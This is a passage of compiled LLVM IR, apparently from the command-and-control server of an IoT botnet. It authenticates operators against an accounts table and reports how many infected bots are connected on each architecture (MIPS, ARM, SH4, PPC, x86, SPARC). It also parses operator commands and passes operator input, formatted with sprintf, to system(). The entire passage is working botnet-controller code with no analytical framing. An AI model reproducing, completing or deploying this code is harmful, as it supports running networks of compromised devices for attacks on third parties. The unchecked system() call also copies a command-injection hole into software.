  %269 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %268
  %270 = getelementptr inbounds %struct.account, %struct.account* %269, i32 0, i32 1
  %271 = getelementptr inbounds [200 x i8], [200 x i8]* %270, i64 0, i64 0
  %272 = call i32 @strcmp(i8* %266, i8* %271) #9
  %273 = icmp ne i32 %272, 0
  br i1 %273, label %274, label %275

274:                                              ; preds = %264
  br label %278

275:                                              ; preds = %264
  %276 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %276, i8 0, i64 2048, i1 false)
  br label %284

277:                                              ; preds = %232
  br label %278

278:                                              ; preds = %277, %274
  %279 = load i32, i32* %4, align 4
  %280 = call i64 @send(i32 %279, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.33, i64 0, i64 0), i64 5, i32 16384)
  %281 = icmp eq i64 %280, -1
  br i1 %281, label %282, label %283

282:                                              ; preds = %278
  br label %2807

283:                                              ; preds = %278
  br label %284

284:                                              ; preds = %2750, %2745, %2740, %2735, %283, %275
  %285 = load i8*, i8** %3, align 8
  %286 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %285) #8
  %287 = load i32, i32* %4, align 4
  %288 = call i64 @send(i32 %287, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.34, i64 0, i64 0), i64 14, i32 16384)
  %289 = icmp eq i64 %288, -1
  br i1 %289, label %290, label %291

290:                                              ; preds = %284
  br label %2807

291:                                              ; preds = %284
  %292 = load i32, i32* %4, align 4
  %293 = call i64 @send(i32 %292, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.35, i64 0, i64 0), i64 2, i32 16384)
  %294 = icmp eq i64 %293, -1
  br i1 %294, label %295, label %296

295:                                              ; preds = %291
  br label %2807

296:                                              ; preds = %291
  %297 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %298 = call i32 (i8*, i8*, ...) @sprintf(i8* %297, i8* getelementptr inbounds ([148 x i8], [148 x i8]* @.str.36, i64 0, i64 0)) #8
  %299 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %300 = call i32 (i8*, i8*, ...) @sprintf(i8* %299, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.37, i64 0, i64 0)) #8
  %301 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %302 = call i32 (i8*, i8*, ...) @sprintf(i8* %301, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i64 0, i64 0)) #8
  %303 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %304 = call i32 (i8*, i8*, ...) @sprintf(i8* %303, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i64 0, i64 0)) #8
  %305 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %306 = call i32 (i8*, i8*, ...) @sprintf(i8* %305, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i64 0, i64 0)) #8
  %307 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %308 = call i32 (i8*, i8*, ...) @sprintf(i8* %307, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i64 0, i64 0)) #8
  %309 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %310 = call i32 (i8*, i8*, ...) @sprintf(i8* %309, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i64 0, i64 0)) #8
  %311 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %312 = call i32 (i8*, i8*, ...) @sprintf(i8* %311, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i64 0, i64 0)) #8
  %313 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %314 = call i32 (i8*, i8*, ...) @sprintf(i8* %313, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.39, i64 0, i64 0)) #8
  %315 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %316 = call i32 (i8*, i8*, ...) @sprintf(i8* %315, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.39, i64 0, i64 0)) #8
  %317 = load i32, i32* %4, align 4
  %318 = call i64 @send(i32 %317, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.34, i64 0, i64 0), i64 14, i32 16384)
  %319 = icmp eq i64 %318, -1
  br i1 %319, label %320, label %321

320:                                              ; preds = %296
  br label %2807

321:                                              ; preds = %296
  %322 = load i32, i32* %4, align 4
  %323 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %324 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %325 = call i64 @strlen(i8* %324) #9
  %326 = call i64 @send(i32 %322, i8* %323, i64 %325, i32 16384)
  %327 = icmp eq i64 %326, -1
  br i1 %327, label %328, label %329

328:                                              ; preds = %321
  br label %2807

329:                                              ; preds = %321
  %330 = load i32, i32* %4, align 4
  %331 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %332 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %333 = call i64 @strlen(i8* %332) #9
  %334 = call i64 @send(i32 %330, i8* %331, i64 %333, i32 16384)
  %335 = icmp eq i64 %334, -1
  br i1 %335, label %336, label %337

336:                                              ; preds = %329
  br label %2807

337:                                              ; preds = %329
  %338 = load i32, i32* %4, align 4
  %339 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %340 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %341 = call i64 @strlen(i8* %340) #9
  %342 = call i64 @send(i32 %338, i8* %339, i64 %341, i32 16384)
  %343 = icmp eq i64 %342, -1
  br i1 %343, label %344, label %345

344:                                              ; preds = %337
  br label %2807

345:                                              ; preds = %337
  %346 = load i32, i32* %4, align 4
  %347 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %348 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %349 = call i64 @strlen(i8* %348) #9
  %350 = call i64 @send(i32 %346, i8* %347, i64 %349, i32 16384)
  %351 = icmp eq i64 %350, -1
  br i1 %351, label %352, label %353

352:                                              ; preds = %345
  br label %2807

353:                                              ; preds = %345
  %354 = load i32, i32* %4, align 4
  %355 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %356 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %357 = call i64 @strlen(i8* %356) #9
  %358 = call i64 @send(i32 %354, i8* %355, i64 %357, i32 16384)
  %359 = icmp eq i64 %358, -1
  br i1 %359, label %360, label %361

360:                                              ; preds = %353
  br label %2807

361:                                              ; preds = %353
  %362 = load i32, i32* %4, align 4
  %363 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %364 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %365 = call i64 @strlen(i8* %364) #9
  %366 = call i64 @send(i32 %362, i8* %363, i64 %365, i32 16384)
  %367 = icmp eq i64 %366, -1
  br i1 %367, label %368, label %369

368:                                              ; preds = %361
  br label %2807

369:                                              ; preds = %361
  %370 = load i32, i32* %4, align 4
  %371 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %372 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %373 = call i64 @strlen(i8* %372) #9
  %374 = call i64 @send(i32 %370, i8* %371, i64 %373, i32 16384)
  %375 = icmp eq i64 %374, -1
  br i1 %375, label %376, label %377

376:                                              ; preds = %369
  br label %2807

377:                                              ; preds = %369
  %378 = load i32, i32* %4, align 4
  %379 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %380 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %381 = call i64 @strlen(i8* %380) #9
  %382 = call i64 @send(i32 %378, i8* %379, i64 %381, i32 16384)
  %383 = icmp eq i64 %382, -1
  br i1 %383, label %384, label %385

384:                                              ; preds = %377
  br label %2807

385:                                              ; preds = %377
  %386 = load i32, i32* %4, align 4
  %387 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %388 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %389 = call i64 @strlen(i8* %388) #9
  %390 = call i64 @send(i32 %386, i8* %387, i64 %389, i32 16384)
  %391 = icmp eq i64 %390, -1
  br i1 %391, label %392, label %393

392:                                              ; preds = %385
  br label %2807

393:                                              ; preds = %385
  %394 = load i32, i32* %4, align 4
  %395 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %396 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %397 = call i64 @strlen(i8* %396) #9
  %398 = call i64 @send(i32 %394, i8* %395, i64 %397, i32 16384)
  %399 = icmp eq i64 %398, -1
  br i1 %399, label %400, label %401

400:                                              ; preds = %393
  br label %2807

401:                                              ; preds = %393
  br label %402

402:                                              ; preds = %401
  %403 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %404 = load i32, i32* %5, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %405
  %407 = getelementptr inbounds %struct.account, %struct.account* %406, i32 0, i32 0
  %408 = getelementptr inbounds [200 x i8], [200 x i8]* %407, i64 0, i64 0
  %409 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %410 = call i32 (i8*, i8*, ...) @sprintf(i8* %403, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %408, i8* %409) #8
  %411 = load i32, i32* %4, align 4
  %412 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %413 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %414 = call i64 @strlen(i8* %413) #9
  %415 = call i64 @send(i32 %411, i8* %412, i64 %414, i32 16384)
  %416 = icmp eq i64 %415, -1
  br i1 %416, label %417, label %418

417:                                              ; preds = %402
  br label %2807

418:                                              ; preds = %402
  br label %419

419:                                              ; preds = %418
  %420 = load i8*, i8** %3, align 8
  %421 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %420) #8
  %422 = load i32, i32* %4, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %423
  %425 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %424, i32 0, i32 1
  store i32 1, i32* %425, align 4
  br label %426

426:                                              ; preds = %2783, %2782, %2151, %2043, %1778, %1640, %1532, %1374, %1276, %1195, %1038, %919, %812, %419
  %427 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %428 = load i32, i32* %4, align 4
  %429 = call i32 @fdgets(i8* %427, i32 2048, i32 %428)
  %430 = icmp sgt i32 %429, 0
  br i1 %430, label %431, label %2806

431:                                              ; preds = %426
  %432 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %433 = call i8* @strstr(i8* %432, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.41, i64 0, i64 0)) #9
  %434 = icmp ne i8* %433, null
  br i1 %434, label %455, label %435

435:                                              ; preds = %431
  %436 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %437 = call i8* @strstr(i8* %436, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i64 0, i64 0)) #9
  %438 = icmp ne i8* %437, null
  br i1 %438, label %455, label %439

439:                                              ; preds = %435
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %441 = call i8* @strstr(i8* %440, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0)) #9
  %442 = icmp ne i8* %441, null
  br i1 %442, label %455, label %443

443:                                              ; preds = %439
  %444 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %445 = call i8* @strstr(i8* %444, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i64 0, i64 0)) #9
  %446 = icmp ne i8* %445, null
  br i1 %446, label %455, label %447

447:                                              ; preds = %443
  %448 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %449 = call i8* @strstr(i8* %448, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.45, i64 0, i64 0)) #9
  %450 = icmp ne i8* %449, null
  br i1 %450, label %455, label %451

451:                                              ; preds = %447
  %452 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %453 = call i8* @strstr(i8* %452, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i64 0, i64 0)) #9
  %454 = icmp ne i8* %453, null
  br i1 %454, label %455, label %554

455:                                              ; preds = %451, %447, %443, %439, %435, %431
  %456 = load i8*, i8** %12, align 8
  %457 = load i32, i32* %5, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %458
  %460 = getelementptr inbounds %struct.account, %struct.account* %459, i32 0, i32 2
  %461 = getelementptr inbounds [200 x i8], [200 x i8]* %460, i64 0, i64 0
  %462 = call i32 @strcmp(i8* %456, i8* %461) #9
  %463 = icmp eq i32 %462, 0
  br i1 %463, label %464, label %542

464:                                              ; preds = %455
  %465 = getelementptr inbounds [128 x i8], [128 x i8]* %42, i64 0, i64 0
  %466 = call i32 @mipsConnected()
  %467 = call i32 (i8*, i8*, ...) @sprintf(i8* %465, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.47, i64 0, i64 0), i32 %466) #8
  %468 = getelementptr inbounds [128 x i8], [128 x i8]* %44, i64 0, i64 0
  %469 = call i32 @armConnected()
  %470 = call i32 (i8*, i8*, ...) @sprintf(i8* %468, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.48, i64 0, i64 0), i32 %469) #8
  %471 = getelementptr inbounds [128 x i8], [128 x i8]* %43, i64 0, i64 0
  %472 = call i32 @sh4Connected()
  %473 = call i32 (i8*, i8*, ...) @sprintf(i8* %471, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.49, i64 0, i64 0), i32 %472) #8
  %474 = getelementptr inbounds [128 x i8], [128 x i8]* %45, i64 0, i64 0
  %475 = call i32 @ppcConnected()
  %476 = call i32 (i8*, i8*, ...) @sprintf(i8* %474, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.50, i64 0, i64 0), i32 %475) #8
  %477 = getelementptr inbounds [128 x i8], [128 x i8]* %46, i64 0, i64 0
  %478 = call i32 @x86Connected()
  %479 = call i32 (i8*, i8*, ...) @sprintf(i8* %477, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.51, i64 0, i64 0), i32 %478) #8
  %480 = getelementptr inbounds [128 x i8], [128 x i8]* %47, i64 0, i64 0
  %481 = call i32 @spcConnected()
  %482 = call i32 (i8*, i8*, ...) @sprintf(i8* %480, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.52, i64 0, i64 0), i32 %481) #8
  %483 = getelementptr inbounds [128 x i8], [128 x i8]* %41, i64 0, i64 0
  %484 = call i32 @clientsConnected()
  %485 = call i32 (i8*, i8*, ...) @sprintf(i8* %483, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.53, i64 0, i64 0), i32 %484) #8
  %486 = load i32, i32* %4, align 4
  %487 = getelementptr inbounds [128 x i8], [128 x i8]* %42, i64 0, i64 0
  %488 = getelementptr inbounds [128 x i8], [128 x i8]* %42, i64 0, i64 0
  %489 = call i64 @strlen(i8* %488) #9
  %490 = call i64 @send(i32 %486, i8* %487, i64 %489, i32 16384)
  %491 = icmp eq i64 %490, -1
  br i1 %491, label %492, label %493

492:                                              ; preds = %464
  br label %2807

493:                                              ; preds = %464
  %494 = load i32, i32* %4, align 4
  %495 = getelementptr inbounds [128 x i8], [128 x i8]* %43, i64 0, i64 0
  %496 = getelementptr inbounds [128 x i8], [128 x i8]* %43, i64 0, i64 0
  %497 = call i64 @strlen(i8* %496) #9
  %498 = call i64 @send(i32 %494, i8* %495, i64 %497, i32 16384)
  %499 = icmp eq i64 %498, -1
  br i1 %499, label %500, label %501

500:                                              ; preds = %493
  br label %2807

501:                                              ; preds = %493
  %502 = load i32, i32* %4, align 4
  %503 = getelementptr inbounds [128 x i8], [128 x i8]* %44, i64 0, i64 0
  %504 = getelementptr inbounds [128 x i8], [128 x i8]* %44, i64 0, i64 0
  %505 = call i64 @strlen(i8* %504) #9
  %506 = call i64 @send(i32 %502, i8* %503, i64 %505, i32 16384)
  %507 = icmp eq i64 %506, -1
  br i1 %507, label %508, label %509

508:                                              ; preds = %501
  br label %2807

509:                                              ; preds = %501
  %510 = load i32, i32* %4, align 4
  %511 = getelementptr inbounds [128 x i8], [128 x i8]* %45, i64 0, i64 0
  %512 = getelementptr inbounds [128 x i8], [128 x i8]* %45, i64 0, i64 0
  %513 = call i64 @strlen(i8* %512) #9
  %514 = call i64 @send(i32 %510, i8* %511, i64 %513, i32 16384)
  %515 = icmp eq i64 %514, -1
  br i1 %515, label %516, label %517

516:                                              ; preds = %509
  br label %2807

517:                                              ; preds = %509
  %518 = load i32, i32* %4, align 4
  %519 = getelementptr inbounds [128 x i8], [128 x i8]* %46, i64 0, i64 0
  %520 = getelementptr inbounds [128 x i8], [128 x i8]* %46, i64 0, i64 0
  %521 = call i64 @strlen(i8* %520) #9
  %522 = call i64 @send(i32 %518, i8* %519, i64 %521, i32 16384)
  %523 = icmp eq i64 %522, -1
  br i1 %523, label %524, label %525

524:                                              ; preds = %517
  br label %2807

525:                                              ; preds = %517
  %526 = load i32, i32* %4, align 4
  %527 = getelementptr inbounds [128 x i8], [128 x i8]* %47, i64 0, i64 0
  %528 = getelementptr inbounds [128 x i8], [128 x i8]* %47, i64 0, i64 0
  %529 = call i64 @strlen(i8* %528) #9
  %530 = call i64 @send(i32 %526, i8* %527, i64 %529, i32 16384)
  %531 = icmp eq i64 %530, -1
  br i1 %531, label %532, label %533

532:                                              ; preds = %525
  br label %2807

533:                                              ; preds = %525
  %534 = load i32, i32* %4, align 4
  %535 = getelementptr inbounds [128 x i8], [128 x i8]* %41, i64 0, i64 0
  %536 = getelementptr inbounds [128 x i8], [128 x i8]* %41, i64 0, i64 0
  %537 = call i64 @strlen(i8* %536) #9
  %538 = call i64 @send(i32 %534, i8* %535, i64 %537, i32 16384)
  %539 = icmp eq i64 %538, -1
  br i1 %539, label %540, label %541

540:                                              ; preds = %533
  br label %2807

541:                                              ; preds = %533
  br label %553

542:                                              ; preds = %455
  %543 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %544 = call i32 (i8*, i8*, ...) @sprintf(i8* %543, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.54, i64 0, i64 0)) #8
  %545 = load i32, i32* %4, align 4
  %546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %547 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %548 = call i64 @strlen(i8* %547) #9
  %549 = call i64 @send(i32 %545, i8* %546, i64 %548, i32 16384)
  %550 = icmp eq i64 %549, -1
  br i1 %550, label %551, label %552

551:                                              ; preds = %542
  br label %552

552:                                              ; preds = %551, %542
  br label %553

553:                                              ; preds = %552, %541
  br label %554

554:                                              ; preds = %553, %451
  %555 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %556 = call i8* @strstr(i8* %555, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.55, i64 0, i64 0)) #9
  %557 = icmp ne i8* %556, null
  br i1 %557, label %562, label %558

558:                                              ; preds = %554
  %559 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %560 = call i8* @strstr(i8* %559, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i64 0, i64 0)) #9
  %561 = icmp ne i8* %560, null
  br i1 %561, label %562, label %605

562:                                              ; preds = %558, %554
  %563 = load i8*, i8** %12, align 8
  %564 = load i32, i32* %5, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %565
  %567 = getelementptr inbounds %struct.account, %struct.account* %566, i32 0, i32 2
  %568 = getelementptr inbounds [200 x i8], [200 x i8]* %567, i64 0, i64 0
  %569 = call i32 @strcmp(i8* %563, i8* %568) #9
  %570 = icmp eq i32 %569, 0
  br i1 %570, label %571, label %593

571:                                              ; preds = %562
  %572 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %573 = call i8* @strtok(i8* %572, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i64 0, i64 0)) #8
  store i8* %573, i8** %49, align 8
  %574 = load i8*, i8** %49, align 8
  %575 = getelementptr inbounds i8, i8* %574, i64 8
  store i8* %575, i8** %50, align 8
  %576 = load i8*, i8** %50, align 8
  call void @trim(i8* %576)
  %577 = load i8*, i8** %50, align 8
  %578 = getelementptr inbounds [100 x i8*], [100 x i8*]* %48, i64 0, i64 0
  %579 = bitcast i8** %578 to i8*
  %580 = call i32 @resolve(i8* %577, i8* %579)
  %581 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %582 = load i8*, i8** %50, align 8
  %583 = getelementptr inbounds [100 x i8*], [100 x i8*]* %48, i64 0, i64 0
  %584 = call i32 (i8*, i8*, ...) @sprintf(i8* %581, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.58, i64 0, i64 0), i8* %582, i8** %583) #8
  %585 = load i32, i32* %4, align 4
  %586 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %587 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %588 = call i64 @strlen(i8* %587) #9
  %589 = call i64 @send(i32 %585, i8* %586, i64 %588, i32 16384)
  %590 = icmp eq i64 %589, -1
  br i1 %590, label %591, label %592

591:                                              ; preds = %571
  store i8* null, i8** %2, align 8
  br label %2816

592:                                              ; preds = %571
  br label %604

593:                                              ; preds = %562
  %594 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %595 = call i32 (i8*, i8*, ...) @sprintf(i8* %594, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.59, i64 0, i64 0)) #8
  %596 = load i32, i32* %4, align 4
  %597 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %598 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %599 = call i64 @strlen(i8* %598) #9
  %600 = call i64 @send(i32 %596, i8* %597, i64 %599, i32 16384)
  %601 = icmp eq i64 %600, -1
  br i1 %601, label %602, label %603

602:                                              ; preds = %593
  br label %603

603:                                              ; preds = %602, %593
  br label %604

604:                                              ; preds = %603, %592
  br label %605

605:                                              ; preds = %604, %558
  %606 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %607 = call i8* @strstr(i8* %606, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.60, i64 0, i64 0)) #9
  %608 = icmp ne i8* %607, null
  br i1 %608, label %613, label %609

609:                                              ; preds = %605
  %610 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %611 = call i8* @strstr(i8* %610, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i64 0, i64 0)) #9
  %612 = icmp ne i8* %611, null
  br i1 %612, label %613, label %670

613:                                              ; preds = %609, %605
  %614 = load i8*, i8** %12, align 8
  %615 = load i32, i32* %5, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %616
  %618 = getelementptr inbounds %struct.account, %struct.account* %617, i32 0, i32 2
  %619 = getelementptr inbounds [200 x i8], [200 x i8]* %618, i64 0, i64 0
  %620 = call i32 @strcmp(i8* %614, i8* %619) #9
  %621 = icmp eq i32 %620, 0
  br i1 %621, label %622, label %658

622:                                              ; preds = %613
  %623 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %624 = call i8* @strtok(i8* %623, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i64 0, i64 0)) #8
  store i8* %624, i8** %51, align 8
  %625 = load i8*, i8** %51, align 8
  %626 = getelementptr inbounds i8, i8* %625, i64 8
  store i8* %626, i8** %52, align 8
  %627 = load i8*, i8** %52, align 8
  call void @trim(i8* %627)
  %628 = getelementptr inbounds [50 x i8*], [50 x i8*]* %53, i64 0, i64 0
  %629 = bitcast i8** %628 to i8*
  %630 = load i8*, i8** %52, align 8
  %631 = call i32 (i8*, i8*, ...) @sprintf(i8* %629, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.62, i64 0, i64 0), i8* %630) #8
  %632 = getelementptr inbounds [50 x i8*], [50 x i8*]* %53, i64 0, i64 0
  %633 = bitcast i8** %632 to i8*
  %634 = call i32 @system(i8* %633)
  %635 = load i32, i32* %5, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %636
  %638 = getelementptr inbounds %struct.account, %struct.account* %637, i32 0, i32 0
  %639 = getelementptr inbounds [200 x i8], [200 x i8]* %638, i64 0, i64 0
  %640 = load i8*, i8** %52, align 8
  %641 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i64 0, i64 0), i8* %639, i8* %640)
  %642 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %643 = load i32, i32* %5, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %644
  %646 = getelementptr inbounds %struct.account, %struct.account* %645, i32 0, i32 0
  %647 = getelementptr inbounds [200 x i8], [200 x i8]* %646, i64 0, i64 0
  %648 = load i8*, i8** %52, align 8
  %649 = call i32 (i8*, i8*, ...) @sprintf(i8* %642, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.64, i64 0, i64 0), i8* %647, i8* %648) #8
  %650 = load i32, i32* %4, align 4
  %651 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %652 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %653 = call i64 @strlen(i8* %652) #9
  %654 = call i64 @send(i32 %650, i8* %651, i64 %653, i32 16384)
  %655 = icmp eq i64 %654, -1
  br i1 %655, label %656, label %657

656:                                              ; preds = %622
  store i8* null, i8** %2, align 8
  br label %2816

657:                                              ; preds = %622
  br label %669

658:                                              ; preds = %613
  %659 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %660 = call i32 (i8*, i8*, ...) @sprintf(i8* %659, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.59, i64 0, i64 0)) #8
  %661 = load i32, i32* %4, align 4
  %662 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %663 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %664 = call i64 @strlen(i8* %663) #9
  %665 = call i64 @send(i32 %661, i8* %662, i64 %664, i32 16384)
  %666 = icmp eq i64 %665, -1
  br i1 %666, label %667, label %668

667:                                              ; preds = %658
  br label %668

668:                                              ; preds = %667, %658
  br label %669

669:                                              ; preds = %668, %657
  br label %670

670:                                              ; preds = %669, %609
  %671 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %672 = call i8* @strstr(i8* %671, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #9
  %673 = icmp ne i8* %672, null
  br i1 %673, label %682, label %674

674:                                              ; preds = %670
  %675 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %676 = call i8* @strstr(i8* %675, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i64 0, i64 0)) #9
  %677 = icmp ne i8* %676, null
  br i1 %677, label %682, label %678

678:                                              ; preds = %674
  %679 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %680 = call i8* @strstr(i8* %679, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i64 0, i64 0)) #9
  %681 = icmp ne i8* %680, null
  br i1 %681, label %682, label %813

682:                                              ; preds = %678, %674, %670
  %683 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i64 0, i64 0
  %684 = call i32 (i8*, i8*, ...) @sprintf(i8* %683, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.68, i64 0, i64 0)) #8
  %685 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %686 = call i32 (i8*, i8*, ...) @sprintf(i8* %685, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
